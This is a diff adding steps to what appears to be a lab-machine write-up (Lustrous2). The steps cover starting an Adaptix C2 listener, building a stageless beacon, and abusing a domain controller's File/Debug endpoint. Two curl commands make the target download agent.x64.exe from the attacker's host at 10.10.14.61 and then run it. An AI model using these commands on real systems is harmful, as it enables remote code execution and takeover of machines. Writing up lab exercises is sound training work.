@@ -600,6 +600,8 @@ export KRB5CCNAME=ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
 
 Then ill export it
 
+# Be
+
 The next thing ill do is start up adaptix and get logged in to the teamserver
 
 From there ill set a listener on port 443 and generate a stagless exe, shouldnt have to worry about obfuscation as i dont think defender is running
@@ -612,5 +614,14 @@ Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
 Ill then start up a web server to host the beacon
 
 ```python
-
+curl -X POST --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Debug' --data "command=iwr http://10.10.14.61:9000/agent.x64.exe -OutFile \programdata\agent.x64.exe" --data "pin=ba45c518"
 ```
+
+Then ill pass in the command to reach out to my server and save it in programdata using the pin
+
+```python
+curl -X POST --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Debug' --data "command=C:\programdata\agent.x64.exe" --data "pin=ba45c518"
+```
+
+Then ill just run the agent
+
